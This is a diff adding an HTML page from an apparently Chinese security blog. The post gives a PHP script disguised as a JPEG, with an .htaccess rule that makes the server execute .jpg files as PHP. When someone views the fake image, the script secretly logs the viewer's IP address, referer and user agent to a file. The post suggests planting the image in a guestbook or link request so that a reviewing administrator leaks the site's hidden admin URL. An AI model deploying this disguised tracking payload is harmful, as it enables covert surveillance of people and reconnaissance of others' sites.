@@ -1,0 +1,559 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="没有天生的大牛，更没有永远的菜鸟求知若饥 , 虚心若愚">
+  <meta name="author" content="iceH">
+  <meta name="keywords" content="">
+  <title>访问我的图片就获取你ip和访问地址 - iceH’s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css# 滚动条颜色.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css# 鼠标指针.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.secice.cn","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="iceH’s Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>iceH's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-books"></i>
+                博文
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/archives/">
+                    <i class="iconfont icon-archive-fill"></i>
+                    归档
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/categories/">
+                    <i class="iconfont icon-category-fill"></i>
+                    分类
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/tags/">
+                    <i class="iconfont icon-tags-fill"></i>
+                    标签
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/playlist/">
+                <i class="iconfont icon-music"></i>
+                音乐
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="访问我的图片就获取你ip和访问地址">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-01-31 09:42" pubdate>
+        2018年1月31日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      358 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      5
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">访问我的图片就获取你ip和访问地址</h1>
+            
+            <div class="markdown-body">
+              <h3 id="新建个名为-htaccess的文件，内容如下"><a href="#新建个名为-htaccess的文件，内容如下" class="headerlink" title="新建个名为.htaccess的文件，内容如下"></a>新建个名为.htaccess的文件，内容如下</h3><p><code>AddHandler application/x-httpd-php .jpg</code></p>
+<h3 id="新建个1-jpg，内容如下"><a href="#新建个1-jpg，内容如下" class="headerlink" title="新建个1.jpg，内容如下"></a>新建个1.jpg，内容如下</h3><a id="more"></a>
+
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
+        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;‘&quot;</span>, <span class="hljs-variable">$str</span>);
+        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;“&quot;</span>, <span class="hljs-variable">$str</span>);
+        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;《&quot;</span>, <span class="hljs-variable">$str</span>);
+        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;》&quot;</span>, <span class="hljs-variable">$str</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;
+    &#125;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIP</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>)) &#123;
+        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>);
+        &#125;
+        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) &#123;
+        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);
+        &#125;
+        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) &#123;
+        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED&#x27;</span>);
+        &#125;
+        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>)) &#123;
+        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>);
+
+        &#125;
+        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED&#x27;</span>)) &#123;
+        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED&#x27;</span>);
+        &#125;
+        <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];
+        &#125;
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ip</span>;
+    &#125;
+
+    <span class="hljs-variable">$ip</span> = getIP();
+    @<span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>;
+    <span class="hljs-variable">$ua</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>].<span class="hljs-string">&quot;\r\n\r\n&quot;</span>;
+    date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);
+    <span class="hljs-variable">$date_</span> = date(<span class="hljs-string">&quot;Y.m.d,h:i:sa&quot;</span>).<span class="hljs-string">&quot;\r\n&quot;</span>;
+
+<span class="hljs-comment">//记录后台地址等信息</span>
+    <span class="hljs-variable">$hack</span> = <span class="hljs-string">&#x27;date: &#x27;</span>.<span class="hljs-variable">$date_</span>.<span class="hljs-string">&#x27;ip:&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-string">&#x27;referer: &#x27;</span>.<span class="hljs-variable">$referer</span>.<span class="hljs-string">&#x27;ua: &#x27;</span>.<span class="hljs-variable">$ua</span>;
+    <span class="hljs-variable">$hack</span> = filter_dangerous_words(<span class="hljs-variable">$hack</span>);
+    <span class="hljs-variable">$op</span> = fopen(<span class="hljs-string">&#x27;hack.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>);
+    fwrite(<span class="hljs-variable">$op</span>,<span class="hljs-variable">$hack</span>);
+    fclose(<span class="hljs-variable">$op</span>);
+
+<span class="hljs-comment">//伪装成图片</span>
+    <span class="hljs-variable">$im</span> = imagecreatefromjpeg(<span class="hljs-string">&quot;2.jpg&quot;</span>);<span class="hljs-comment">//注意该目录下，也要有2.jpg这个图片</span>
+    header(<span class="hljs-string">&#x27;Content-Type: image/jpeg&#x27;</span>);
+    imagejpeg(<span class="hljs-variable">$im</span>);
+    imagedestroy(<span class="hljs-variable">$im</span>);
+ <span class="hljs-meta">?&gt;</span>
+</code></pre>
+
+<h3 id="放个正常图片，名为2-jpg。"><a href="#放个正常图片，名为2-jpg。" class="headerlink" title="放个正常图片，名为2.jpg。"></a>放个正常图片，名为2.jpg。</h3><h3 id="访问http-127-0-0-1-1-jpg"><a href="#访问http-127-0-0-1-1-jpg" class="headerlink" title="访问http://127.0.0.1/1.jpg"></a>访问<a target="_blank" rel="noopener" href="http://127.0.0.1/1.jpg">http://127.0.0.1/1.jpg</a></h3><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>在留言板或者申请友链页面填信息，然后提交</p>
+<p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/01.png" srcset="/img/loading.gif" alt="访问我的图片就获取你ip和访问地址"></p>
+<p>等管理员在后台审核的时候看到这图片</p>
+<p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/02.png" srcset="/img/loading.gif" alt="02"></p>
+<p>此时就会在你该文件的相同目录下生成一个hack.txt</p>
+<p><img src="/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/03.png" srcset="/img/loading.gif" alt="03"></p>
+<p>这样就获取到后台地址了。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/">学习文章</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/">学习文章</a>
+                    
+                  </div>
+                
+              </div>
+              <p class="note note-warning">
+              <strong>本文作者: </strong><a href="/">iceH</a> <br>
+              <strong>本文链接: </strong><a href="http://www.secice.cn/post/a23ac9c4">http://www.secice.cn/post/a23ac9c4</a> <br>
+              <strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                 </p>
+                 
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/40eeea0e">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">解决DEDECMS历史难题--找后台目录</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/4484eea8">
+                        <span class="hidden-mobile">谈一谈文件包含漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+  <div class="col-lg-7 mx-auto nopadding-md">
+    <div class="container custom post-custom mx-auto">
+      <img src="https://cdn.jsdelivr.net/gh/bynotes/bynotes.github.io/img/psb.gif" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:300px; height:150px;">
+    </div>
+  </div>
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <span>iceH</span> <i class="iconfont icon-love"></i> <span>一条啥也不会的咸鱼！</span> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/qipao.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/jingtaisidai.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/dianjichuzi.js"></script>
+<script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script>
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
